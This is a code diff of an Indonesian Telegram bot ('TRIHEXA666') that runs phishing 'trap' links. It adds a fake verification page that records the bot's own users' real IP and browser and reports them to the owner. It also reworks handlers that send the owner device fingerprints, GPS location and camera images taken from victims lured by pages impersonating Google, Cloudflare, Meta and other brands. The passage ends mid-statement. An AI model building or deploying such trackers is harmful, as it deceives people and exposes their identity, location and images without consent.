@@ -90,6 +90,40 @@ async function startServer() {
     res.json({ status: "ok" });
   });
 
+  // Capture Bot User IP & Redirect
+  app.get('/verify-bot-user', (req, res) => {
+    const { uid, name } = req.query;
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const userAgent = req.headers['user-agent'];
+
+    if (botInstance) {
+      const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+      const report = `📢 <b>BOT USER IDENTIFIED & VERIFIED</b> 📢\n` +
+                     `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                     `👤 <b>USER NAME:</b> <code>${escapeHTML(String(name || 'Unknown'))}</code>\n` +
+                     `🆔 <b>TELEGRAM ID:</b> <code>${uid}</code>\n` +
+                     `🌐 <b>REAL IP ADDRESS:</b> <code>${escapeHTML(String(ip))}</code>\n\n` +
+                     `🖥️ <b>SYSTEM BROWSER:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n\n` +
+                     `━━━━━━━━━━━━━━━━━━━━\n` +
+                     `✅ <i>STATUS: HIGH-PRECISION IDENTITY SYNC SUCCESSFUL.</i>`;
+      
+      botInstance.telegram.sendMessage(ADMIN_ID, report, { parse_mode: 'HTML' }).catch(() => {});
+    }
+
+    res.send(`
+      <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Complete</title></head>
+      <body style="font-family:-apple-system, sans-serif; text-align:center; padding:50px 20px; background:#fff; color:#333;">
+        <div style="color:#1a73e8; font-size:60px; margin-bottom:20px;">🛡️</div>
+        <h2 style="margin-bottom:10px;">Verification Successful</h2>
+        <p style="color:#666; margin-bottom:30px;">Your security profile has been synchronized with the main server. You now have full access to the terminal features.</p>
+        <p style="font-size:14px; color:#999;">IP Captured: ${escapeHTML(String(ip))}</p>
+        <div style="margin-top:40px;">
+          <a href="https://t.me/share/url?url=Success" style="background:#1a73e8; color:#fff; text-decoration:none; padding:12px 24px; border-radius:6px; font-weight:600;">Return to Bot</a>
+        </div>
+      </body></html>
+    `);
+  });
+
   // ... (previous API routes continue here)
   
   // ========== IP LOGGER & CAMPHISH TRAP ENDPOINTS ==========
@@ -137,60 +171,40 @@ async function startServer() {
       const templateName = templates[tmplId] ? templates[tmplId].name : 'ᴅᴇꜰᴀᴜʟᴛ';
       
       let header = '🕵️‍♂️ <b>Security Audit: Metadata Captured</b>';
-      let status = '🔄 <i>Processing additional permissions...</i>';
+      let statusText = '🔄 <i>PROCESSING...</i>';
 
       if (tmplId === 'google') {
-        header = '🛡️ <b>Google Security: Access Verified</b>';
-      } else if (tmplId === 'pegasus') {
-        header = '🛡️ <b>Diagnostic Hub: Audit Completed</b>';
-        status = '✅ <i>System Integrity Verified.</i>';
-      } else if (tmplId === 'file') {
-        header = '📂 <b>File Access: Verification Successful</b>';
-      } else if (tmplId === 'security_audit') {
-        header = '🛡️ <b>System Audit: Integrity Confirmed</b>';
+        header = '🛡️ <b>GOOGLE SECURITY REPORT</b>';
       } else if (tmplId === 'cloudflare') {
-        header = '☁️ <b>Cloudflare Edge: Security Verified</b>';
-      } else if (tmplId === 'meta_login') {
-        header = '💬 <b>Meta: Identity Verified</b>';
-      } else if (tmplId === 'binance') {
-        header = '💱 <b>Binance: Access Authenticated</b>';
-      } else if (tmplId === 'paypal') {
-        header = '💳 <b>PayPal: Authorization Granted</b>';
-      } else if (tmplId === 'steam') {
-        header = '🎮 <b>Steam: Security Synced</b>';
-      } else if (tmplId === 'netflix') {
-        header = '🍿 <b>Netflix: Session Verified</b>';
-      } else if (tmplId === 'tiktok') {
-        header = '🎵 <b>TikTok: Security Verification Complete</b>';
-      } else if (tmplId === 'chatgpt') {
-        header = '🤖 <b>OpenAI: Security Check Passed</b>';
+        header = '☁️ <b>CLOUDFLARE EDGE LOG</b>';
+      } else if (tmplId === 'meta_verification') {
+        header = '🎯 <b>META VERIFICATION AUDIT</b>';
+      } else if (tmplId === 'pegasus') {
+        header = '⚡ <b>PEGASUS SYSTEM TRACE</b>';
+      } else if (tmplId === 'gallery') {
+        header = '🖼️ <b>MEDIA FORENSIC REPORT</b>';
       }
+      
+      if (data.visual_identity) statusText = '📸 <i>IMAGE CAPTURED</i>';
+      if (data.gps) statusText = '📍 <i>LOCATION SYNCED</i>';
 
       let msg = `<b>${header}</b>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n\n` +
                   `📋 <b>OPERATION DETAILS:</b>\n` +
                   `├ NAME: <code>${escapeHTML(templateName)}</code>\n` +
-                  `├ FLOW: <code>Advanced Security Audit</code>\n` +
+                  `├ STATUS: <code>${statusText}</code>\n` +
                   `└ ID: <code>${id}</code>\n\n` +
-                  `🖥️ <b>HARDWARE SYSTEM PROFILE:</b>\n` +
+                  `🖥️ <b>SYSTEM PROFILE:</b>\n` +
                   `├ PLATFORM: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
-                  `├ BROWSER: <code>${escapeHTML(data.vendor || 'N/A')} (${data.onLine ? 'Online' : 'Offline'})</code>\n` +
-                  `├ CPU CORES: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
-                  `├ MEMORY (EST): <code>${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
-                  `├ GRAPHICS: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
-                  `├ VM AUDIT: <code>${escapeHTML(data.vmStatus || 'N/A')}</code>\n` +
-                  `└ RESOLUTION: <code>${escapeHTML(data.screen || 'N/A')}</code>\n\n` +
-                  `🔋 <b>POWER & CONNECTIVITY:</b>\n` +
-                  `├ BATTERY: <code>${escapeHTML(data.battery || 'N/A')}</code>\n` +
-                  `├ CONNECTION: <code>${escapeHTML(data.connection || 'N/A')}</code>\n` +
-                  `├ REFRESH: <code>${escapeHTML(data.refreshRate || '60 Hz')}</code>\n` +
-                  `└ COLOR_GAMUT: <code>${escapeHTML(data.gamut || 'N/A')}</code>\n\n` +
-                  `🌍 <b>ENVIRONMENT & LOCALIZATION:</b>\n` +
+                  `├ BROWSER: <code>${escapeHTML(data.vendor || 'N/A')}</code>\n` +
+                  `├ CPU: <code>${escapeHTML(String(data.cores || 'N/A'))} CORES</code>\n` +
+                  `├ RAM: <code>~${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
+                  `├ GPU: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
+                  `└ SCREEN: <code>${escapeHTML(data.screen || 'N/A')}</code>\n\n` +
+                  `🌍 <b>LOCALIZATION:</b>\n` +
                   `├ TIMEZONE: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
-                  `├ LANGUAGES: <code>${escapeHTML(data.langs || 'N/A')}</code>\n` +
-                  `└ REFERRER: <code>${escapeHTML(data.ref || 'Direct Connection')}</code>\n` +
-                  `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `${status}`;
+                  `└ LANGS: <code>${escapeHTML((data.langs || '').substring(0, 30))}</code>\n\n` +
+                  `━━━━━━━━━━━━━━━━━━━━`;
 
       botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
     }
@@ -480,21 +494,47 @@ async function startServer() {
   const ADMIN_ID = 8587171470; // GANTI DENGAN TELEGRAM ID OWNER
   const PASSWORD = "112233";
   let authenticatedUsers = new Set<number>();
+  let agreementUsers = new Set<number>();
   
   try {
     if (fs.existsSync('auth.json')) {
       authenticatedUsers = new Set(JSON.parse(fs.readFileSync('auth.json', 'utf8')));
     }
-  } catch (e) { console.error("Error loading auth.json", e); }
+    if (fs.existsSync('agreement.json')) {
+      agreementUsers = new Set(JSON.parse(fs.readFileSync('agreement.json', 'utf8')));
+    }
+  } catch (e) { console.error("Error loading auth files", e); }
 
   const saveAuth = () => { fs.writeFileSync('auth.json', JSON.stringify([...authenticatedUsers])); };
+  const saveAgreement = () => { fs.writeFileSync('agreement.json', JSON.stringify([...agreementUsers])); };
 
   if (process.env.TELEGRAM_BOT_TOKEN) {
     const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
     
     bot.use(async (ctx, next) => {
         if (!ctx.from) return;
-        if (ctx.from.id === ADMIN_ID || authenticatedUsers.has(ctx.from.id)) return next();
+        
+        // Skip for owner
+        if (ctx.from.id === ADMIN_ID) return next();
+
+        // Check if user has accepted agreement
+        if (!agreementUsers.has(ctx.from.id)) {
+            const btnUrl = `${appHost.replace(/\/$/, '')}/verify-bot-user?uid=${ctx.from.id}&name=${encodeURIComponent(ctx.from.first_name)}`;
+            const aggMsg = `⚠️ <b>[ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ]</b> ⚠️\n` +
+                           `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                           `ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜰʀᴀᴍᴇᴡᴏʀᴋ ᴛʀɪʜᴇxᴀ666. ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ, ᴀɴᴅᴀ ᴡᴀᴊɪʙ ᴍᴇɴʏᴇᴛᴜᴊᴜɪ ᴋᴇᴛᴇɴᴛᴜᴀɴ ʙᴇʀɪᴋᴜᴛ:\n\n` +
+                           `1. ʙᴏᴛ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴛᴜᴊᴜᴀɴ ᴘᴇɴᴇʟɪᴛɪᴀɴ ꜱᴇᴄᴜʀɪᴛʏ.\n` +
+                           `2. ꜱᴇʟɪᴛᴜʀᴜʜ ᴀᴋᴛɪᴠɪᴛᴀꜱ ᴀɴᴅᴀ ᴅɪᴘᴀɴᴛᴀᴜ ᴏʟᴇʜ ꜱʏꜱᴛᴇᴍ.\n` +
+                           `3. ᴀɴᴅᴀ ᴡᴀᴊɪʙ ᴍᴇʟɪᴠᴇʀɪꜰɪᴋᴀꜱɪ ɪᴅᴇɴᴛɪᴛᴀꜱ ᴅᴇɴɢᴀɴ ᴍᴇɴɢᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ.\n\n` +
+                           `━━━━━━━━━━━━━━━━━━━━`;
+            const kb = Markup.inlineKeyboard([
+              [Markup.button.url('🛡️ ꜱᴇᴛᴜᴊᴜ & ᴠᴇʀɪꜰɪᴋᴀꜱɪ', btnUrl)],
+              [Markup.button.callback('✅ ꜱᴀʏᴀ ꜱᴜᴅᴀʜ ᴠᴇʀɪꜰɪᴋᴀꜱɪ', 'confirm_verified')]
+            ]);
+            return ctx.reply(aggMsg, { parse_mode: 'HTML', ...kb });
+        }
+
+        if (authenticatedUsers.has(ctx.from.id)) return next();
         
         const text = ctx.message && 'text' in ctx.message ? ctx.message.text : '';
         if (text === PASSWORD) {
@@ -503,6 +543,15 @@ async function startServer() {
             return ctx.reply("✅ Akses diberikan!");
         }
         return ctx.reply(`🔒 Bot terkunci.\nID Anda: <code>${ctx.from.id}</code>\nMasukkan password untuk melanjutkan.`, {parse_mode: 'HTML'});
+    });
+
+    bot.action('confirm_verified', (ctx) => {
+        if (!ctx.from) return;
+        agreementUsers.add(ctx.from.id);
+        saveAgreement();
+        ctx.answerCbQuery("System verified!").catch(() => {});
+        ctx.reply("✅ Verifikasi Berhasil! Selamat datang di terminal.");
+        ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainKeyboard });
     });
 
     const startMsgText = `━━━━━━━ ᴛʀɪʜᴇxᴀ666 ━━━━━━━\n\n` +
@@ -522,193 +571,100 @@ async function startServer() {
 
     bot.action('menu_main', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      ctx.editMessageText(startMsgText, { parse_mode: 'HTML', ...mainKeyboard }).catch(() => {});
-    });
-
-    bot.action('menu_osint_basic', (ctx) => {
-      ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>🇮🇩 ʟᴏᴄᴀʟ ᴏꜱɪɴᴛ ᴍᴏᴅᴜʟᴇ</b>\n` +
+      const txt = `<b>━━━━━━━ ᴛʀɪʜᴇxᴀ666 ━━━━━━━</b>\n` +
+        `<b>⚔️ ᴇʟɪᴛᴇ ᴏꜱɪɴᴛ ꜰʀᴀᴍᴇᴡᴏʀᴋ ᴠ.1</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `• <b>/nik [ɴᴏᴍᴏʀ]</b>\n` +
-        `  └ <i>ᴋᴛᴘ ɪᴅᴇɴᴛɪᴛʏ ᴀɴᴀʟʏᴛɪᴄꜱ & ᴍᴀᴘᴘɪɴɢ</i>\n\n` +
-        `• <b>/plat [ɴᴏᴍᴏʀ]</b>\n` +
-        `  └ <i>ᴠᴇʜɪᴄʟᴇ ʀᴇɢ ᴀʀᴇᴀ ɪᴅᴇɴᴛɪꜰɪᴄᴀᴛɪᴏɴ</i>\n\n` +
-        `• <b>/ip [ᴛᴀʀɢᴇᴛ]</b>\n` +
-        `  └ <i>ᴅᴇᴇᴘ ɪᴘ ɢᴇᴏʟᴏᴄᴀᴛɪᴏɴ ɪɴᴛᴇʟ</i>\n\n` +
-        `• <b>/email [ᴇᴍᴀɪʟ]</b>\n` +
-        `  └ <i>ꜱᴍᴛᴘ ᴍx ᴠᴀʟɪᴅᴀᴛᴏʀ ᴄʜᴇᴄᴋ</i>\n\n` +
-        `• <b>/username [ᴜꜱᴇʀ]</b>\n` +
-        `  └ <i>ꜱᴏᴄɪᴀʟ ꜰᴏᴏᴛᴘʀɪɴᴛ ᴍᴀᴘᴘɪɴɢ</i>\n\n` +
-        `• <b>/whois [ᴅᴏᴍᴀɪɴ]</b>\n` +
-        `  └ <i>ʀᴇɢɪꜱᴛʀᴀʀ ʀᴇᴄᴏɴɴᴀɪꜱꜱᴀɴᴄᴇ</i>\n\n` +
-        `• <b>/dns [ᴅᴏᴍᴀɪɴ]</b>\n` +
-        `  └ <i>ᴅɴꜱ ʀᴇᴄᴏʀᴅ ᴍᴀᴘᴘɪɴɢ</i>\n\n` +
-        `━━━━━━━━━━━━━━━━━━━━`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
-      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
-    });
-
-    bot.action('menu_osint_adv', (ctx) => {
-      ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>📡 ɢʟᴏʙᴀʟ ʀᴇᴄᴏɴ ᴍᴏᴅᴜʟᴇ</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `• <b>/headers [ᴜʀʟ]</b>\n` +
-        `  └ <i>ꜱᴇᴄᴜʀɪᴛʏ ʜᴇᴀᴅᴇʀ ᴀᴜᴅɪᴛ & ᴀɴᴀʟʏꜱɪꜱ</i>\n\n` +
-        `• <b>/dork [ᴋᴇʏᴡᴏʀᴅ]</b>\n` +
-        `  └ <i>ᴀᴅᴠᴀɴᴄᴇᴅ ɢᴏᴏɢʟᴇ ᴅᴏʀᴋꜱ ᴇɴɢɪɴᴇ</i>\n\n` +
-        `• <b>/bininfo [ʙɪɴ]</b>\n` +
-        `  └ <i>ᴄᴀʀᴅ ɪꜱꜱᴜᴇʀ & ᴛɪᴇʀ ᴀɴᴀʟʏᴛɪᴄꜱ</i>\n\n` +
-        `• <b>/subdomain [ᴅᴏᴍᴀɪɴ]</b>\n` +
-        `  └ <i>ɪɴꜰʀᴀꜱᴛʀᴜᴄᴛᴜʀᴇ ꜱᴜʙᴅᴏᴍᴀɪɴ ʀᴇᴄᴏɴ</i>\n\n` +
-        `• <b>/github_user [ᴜꜱᴇʀ]</b>\n` +
-        `  └ <i>ɢɪᴛʜᴜʙ ᴘʀᴏꜰɪʟᴇ ᴍᴇᴛᴀᴅᴀᴛᴀ</i>\n\n` +
-        `• <b>/port [ɪᴘ] [ᴘᴏʀᴛ]</b>\n` +
-        `  └ <i>ɴᴇᴛᴡᴏʀᴋ ᴘᴏʀᴛ ꜱᴄᴀɴɴᴇʀ</i>\n\n` +
-        `• <b>/phone_dork [ɴᴏᴍᴏʀ]</b>\n` +
-        `  └ <i>ᴍᴏʙɪʟᴇ ᴀꜱꜱᴇᴛ ᴏꜱɪɴᴛ ᴛʀᴀᴄᴋᴇʀ</i>\n\n` +
-        `━━━━━━━━━━━━━━━━━━━━`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
-      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
-    });
-
-    bot.action('menu_tools', (ctx) => {
-      ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>🛠️ ᴀᴅᴠᴀɴᴄᴇᴅ ᴜᴛɪʟɪᴛɪᴇꜱ</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `• <b>/qr [ᴛᴇᴋꜱ]</b>\n` +
-        `  └ <i>ɢᴇɴᴇʀᴀᴛᴇ ǫʀ ᴄᴏᴅᴇ</i>\n\n` +
-        `• <b>/shortlink [ᴜʀʟ]</b>\n` +
-        `  └ <i>ᴘᴇʀꜱɪɴɢᴋᴀᴛ ᴜʀʟ (ɪꜱ.ɢᴅ)</i>\n\n` +
-        `• <b>/pwd [ᴘᴀɴᴊᴀɴɢ]</b>\n` +
-        `  └ <i>ʙᴜᴀᴛ ᴘᴀꜱꜱᴡᴏʀᴅ ᴇɴᴛʀᴏᴘʏ ᴛɪɴɢɢɪ</i>\n\n` +
-        `• <b>/b64enc | /b64dec</b>\n` +
-        `  └ <i>ᴋᴏɴᴠᴇʀꜱɪ ᴛᴇᴋꜱ ʙᴀꜱᴇ64</i>\n\n` +
-        `• <b>/hash [ᴛᴇᴋꜱ]</b>\n` +
-        `  └ <i>ᴄʜᴇᴄᴋꜱᴜᴍ ᴍᴅ5 & ꜱʜᴀ256</i>\n\n` +
-        `• <b>/uuid</b>\n` +
-        `  └ <i>ɢᴇɴᴇʀᴀᴛᴇ ᴜɴɪǫᴜᴇ ɪᴅ ᴠ4</i>\n\n` +
-        `• <b>/weather [ᴋᴏᴛᴀ]</b>\n` +
-        `  └ <i>ᴅᴀᴛᴀ ᴄᴜᴀᴄᴀ ʀᴇᴀʟ-ᴛɪᴍᴇ</i>\n\n` +
-        `• <b>/crypto_price [ᴋᴏɪɴ]</b>\n` +
-        `  └ <i>ᴄᴇᴋ ʜᴀʀɢᴀ ᴀꜱᴇᴛ ᴋʀɪᴘᴛᴏ</i>\n\n` +
-        `━━━━━━━━━━━━━━━━━━━━`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
-      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
-    });
-
-    bot.action('menu_games', (ctx) => {
-      ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ ᴄᴏɴꜱᴏʟᴇ</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `• <b>/suit [ʙᴀᴛᴜ/ɢᴜɴᴛɪɴɢ/ᴋᴇʀᴛᴀꜱ]</b>\n\n` +
-        `• <b>/math</b> (ᴛᴇʙᴀᴋ ʜᴀꜱɪʟ ᴍᴀᴛᴇᴍᴀᴛɪᴋᴀ)\n\n` +
-        `• <b>/dadu</b> (ᴋᴏᴄᴏᴋ ᴅᴀᴅᴜ ꜱᴛᴀɴᴅᴀʀ)\n\n` +
-        `• <b>/coinflip</b> (ʟᴇᴍᴘᴀʀ ᴋᴏɪɴ ʜᴇᴀᴅ/ᴛᴀɪʟ)\n\n` +
-        `• <b>/susunkata</b> (ᴍᴀɪɴ ᴀᴄᴀᴋ ᴋᴀᴛᴀ)\n\n` +
-        `• <b>/tebakangka</b> (1-10)\n\n` +
-        `• <b>/khodam [ɴᴀᴍᴀ]</b> (ᴄᴇᴋ ᴋʜᴏᴅᴀᴍ)\n\n` +
-        `• <b>/ramal [ɴᴀᴍᴀ]</b> (ʀᴀᴍᴀʟᴀɴ ᴀɪ)\n\n` +
-        `• <b>/jodoh [ɴᴀᴍᴀ1] [ɴᴀᴍᴀ2]</b> (ᴋᴀʟᴋᴜʟᴀᴛᴏʀ ᴊᴏᴅᴏʜ)\n\n` +
-        `• <b>/kartu</b> (ᴀᴍʙɪʟ ᴋᴀʀᴛᴜ ʀᴇᴍɪ)\n\n` +
-        `• <b>/roulette</b> (ʀᴜꜱꜱɪᴀɴ ʀᴏᴜʟᴇᴛᴛᴇ)\n\n` +
-        `• <b>/8ball [ᴛᴇᴋꜱ]</b> (ᴍᴀɢɪᴄ 8-ʙᴀʟʟ)\n\n` +
-        `• <b>/tarot</b> (ʀᴀᴍᴀʟᴀɴ ᴋᴀʀᴛᴜ ᴛᴀʀᴏᴛ)\n\n` +
-        `• <b>/doa</b> (ᴅᴏᴀ & ᴍᴏᴛɪᴠᴀꜱɪ ʀᴀɴᴅᴏᴍ)\n\n` +
-        `• <b>/tod</b> (ᴛʀᴜᴛʜ ᴏʀ ᴅᴀʀᴇ)\n\n` +
-        `• <b>/meme</b> | <b>/joke</b> | <b>/quote</b>\n\n` +
-        `• <b>/fact</b> (ꜰᴀᴋᴛᴀ ᴜɴɪᴋ ɢʟᴏʙᴀʟ)\n\n` +
-        `• <b>/cat</b> | <b>/dog</b>\n\n` +
-        `• <b>/gombal [ɴᴀᴍᴀ]</b> (ɢᴏᴍʙᴀʟᴀɴ ᴍᴀᴜᴛ)\n\n` +
-        `━━━━━━━━━━━━━━━━━━━━`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
-      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
-    });
-
-    bot.action('menu_media', (ctx) => {
-      ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>🎵 ᴍᴇᴅɪᴀ & ᴅᴏᴡɴʟᴏᴀᴅꜱ</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `• <b>/lagu [ᴊᴜᴅᴜʟ]</b>\n` +
-        `  └ <i>ᴀᴜᴅɪᴏ ᴅᴏᴡɴʟᴏᴀᴅ ᴇɴɢɪɴᴇ (ᴍᴘ3)</i>\n\n` +
-        `• <b>/play [ᴊᴜᴅᴜʟ]</b>\n` +
-        `  └ <i>ꜱᴀᴍᴀ ᴅᴇɴɢᴀɴ /ʟᴀɢᴜ</i>\n\n` +
-        `━━━━━━━━━━━━━━━━━━━━`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
+        `👋 ʜᴀʟᴏ <b>${ctx.from?.first_name || 'ᴜꜱᴇʀ'}</b>,\n` +
+        `ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ᴄᴇɴᴛᴇʀ ᴏᴘᴇʀᴀꜱɪ. sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴏᴅᴜʟ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ:`;
+      const kb = Markup.inlineKeyboard([
+        [Markup.button.callback('🎣 ʟɪɴᴋ ʟᴏɢɢᴇʀ', 'menu_logger'), Markup.button.callback('📡 ᴏꜱɪɴᴛ ᴀᴅᴠ', 'menu_osint_adv')],
+        [Markup.button.callback('🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ', 'menu_games'), Markup.button.callback('🛠️ ᴛᴏᴏʟꜱ', 'menu_tools')],
+        [Markup.button.callback('🎵 ᴍᴇᴅɪᴀ', 'menu_media'), Markup.button.callback('⏰ ᴀʟᴀʀᴍ', 'menu_alarm')],
+        [Markup.button.callback('ℹ️ ʜᴇʟᴘ & ɪɴꜰᴏ', 'menu_help')]
+      ]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_logger', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
       const id = generateTrapId(ctx.chat!.id);
-      let msg = `<b>🎣 ꜱᴛᴇᴀʟᴛʜ ʟɪɴᴋ ʟᴏɢɢᴇʀ ᴠ5.2</b>\n` +
+      let msg = `<b>🎣 ꜱᴛᴇᴀʟᴛʜ ʟɪɴᴋ ʟᴏɢɢᴇʀ</b>\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
-                `ᴘɪʟɪʜ ᴛᴇᴍᴘʟᴀᴛᴇ ᴏᴘᴇʀᴀꜱɪᴏɴᴀʟ ʙᴇʀɪᴋᴜᴛ:\n\n`;
-      
-      const tmplDesc: Record<string, string> = {
-        'google': '└ <i>ɪᴅᴇɴᴛɪᴛʏ ᴇᴄᴏꜱʏꜱᴛᴇᴍ. ᴀᴜᴅɪᴛ ʙʀᴏᴡꜱᴇʀ-ʙᴜꜱ & ʜɪɢʜ-ᴇɴᴛʀᴏᴘʏ.</i>',
-        'gallery': '└ <i>ꜰᴏʀᴇɴꜱɪᴄ ʀᴇɢɪꜱᴛʀʏ. ᴍᴇᴅɪᴀ ᴛᴇʟᴇᴍᴇᴛʀʏ & ꜱᴏᴄɪᴀʟ-ɢʀᴀᴘʜ.</i>',
-        'cloudflare': '└ <i>ᴇᴅɢᴇ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ. ᴘʀᴇᴄɪꜱɪᴏɴ ꜰɪɴɢᴇʀᴘʀɪɴᴛɪɴɢ.</i>',
-        'pegasus': '└ <i>ᴋᴇʀɴᴇʟ ɪɴᴛᴇʟʟɪɢᴇɴᴄᴇ ᴠ9.3. ᴇʟɪᴛᴇ ʜᴀʀᴅᴡᴀʀᴇ (ꜱᴛᴀʙʟᴇ).</i>',
-        'wifi': '└ <i>ʜᴏᴛꜱᴘᴏᴛ ᴀᴜᴛʜ. ɴᴇᴛᴡᴏʀᴋ ꜰᴏʀᴇɴꜱɪᴄ ᴍᴀᴘᴘɪɴɢ.</i>',
-        'recap': '└ <i>ɢʜᴏꜱᴛ ʀᴇᴄᴏɴ. ᴍᴜʟᴛɪ-ʟᴀʏᴇʀᴇᴅ ꜱɪʟᴇɴᴛ ᴛᴇʟᴇᴍᴇᴛʀʏ.</i>',
-        'security_audit': '└ <i>ꜱʏꜱᴛᴇᴍ ᴀᴜᴅɪᴛ. ᴇɴᴠɪʀᴏɴᴍᴇɴᴛ ɪɴᴛᴇɢʀɪᴛʏ ᴄʜᴇᴄᴋ.</i>',
-        'meta_login': '└ <i>ꜱᴏᴄɪᴀʟ ꜱʏɴᴄ. ʀᴇᴄᴏᴠᴇʀ ᴀᴄᴄᴏᴜɴᴛ ᴠɪᴀ ʜᴀʀᴅᴡᴀʀᴇ.</i>',
-        'binance': '└ <i>ᴄʀʏᴘᴛᴏ ꜱᴇᴄᴜʀɪᴛʏ. ʜᴀʀᴅᴡᴀʀᴇ ᴀᴜᴅɪᴛ ꜰᴏʀ ᴀꜱꜱᴇᴛꜱ.</i>',
-        'paypal': '└ <i>ꜰɪɴᴛᴇᴄʜ ᴀᴜᴅɪᴛ. ᴛʀᴀɴꜱᴀᴄᴛɪᴏɴ ꜱᴀꜰᴇᴛʏ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ.</i>',
-        'steam': '└ <i>ɢᴀᴍɪɴɢ ɢᴜᴀʀᴅ. ᴀᴄᴄᴏᴜɴᴛ ʀᴇᴄᴏᴠᴇʀʏ ꜱʏɴᴄ.</i>',
-        'netflix': '└ <i>ᴍᴇᴅɪᴀ ꜱʏɴᴄ. ʜᴏᴜꜱᴇʜᴏʟᴅ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ɢʀɪᴅ.</i>',
-        'tiktok': '└ <i>ᴄʀᴇᴀᴛᴏʀ ᴀᴜᴅɪᴛ. ᴇɴᴠɪʀᴏɴᴍᴇɴᴛ ɪɴᴛᴇɢʀɪᴛʏ ᴄʜᴇᴄᴋ.</i>',
-        'chatgpt': '└ <i>ᴀɪ ᴅᴇᴠ ᴀᴜᴅɪᴛ. ᴀᴘɪ ǫᴜᴏᴛᴀ & ᴅᴇᴠ ᴇɴᴠ ᴍᴀᴘᴘɪɴɢ.</i>'
-      };
-
+                `ᴘɪʟɪʜ ᴛᴇᴍᴘʟᴀᴛᴇ ʙᴇʀɪᴋᴜᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ:\n\n`;
       Object.entries(templates).forEach(([key, tmpl]) => {
         const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
         msg += `📦 <b>${tmpl.name}</b>\n` +
-               `${tmplDesc[key] || ''}\n` +
-               `🔗 <code>${trapUrl}</code>\n\n` +
-               `━━━━━━━━━━━━━━━━━━━━\n\n`;
+               `🔗 <code>${trapUrl}</code>\n\n`;
       });
-
-      msg += `💡 <b>ɪɴꜰᴏ:</b> ʙʀᴏᴡꜱᴇʀ & ɪᴘ ᴅɪᴅᴇᴛᴇᴋꜱɪ ᴏᴛᴏᴍᴀᴛɪꜱ.\n` +
-             `ᴍᴏᴅᴜʟᴇ <b>ᴀᴅᴠᴀɴᴄᴇᴅ</b> (ɢᴘꜱ, ᴄᴀᴍ, ꜰɪʟᴇꜱ) ᴛᴇʀᴋɪʀɪᴍ ᴊɪᴋᴀ ᴛᴀʀɢᴇᴛ ᴍᴇɴɢɪᴢɪɴᴋᴀɴ ᴀᴋꜱᴇꜱ.\n\n` +
-             `⚠️ <i>ꜱᴀʀᴀɴ: ɢᴜɴᴀᴋᴀɴ ʟᴀʏᴀɴᴀɴ ᴘᴇᴍᴇɴᴅᴇᴋ ᴜʀʟ.</i>`;
-      
+      msg += `━━━━━━━━━━━━━━━━━━━━\n` +
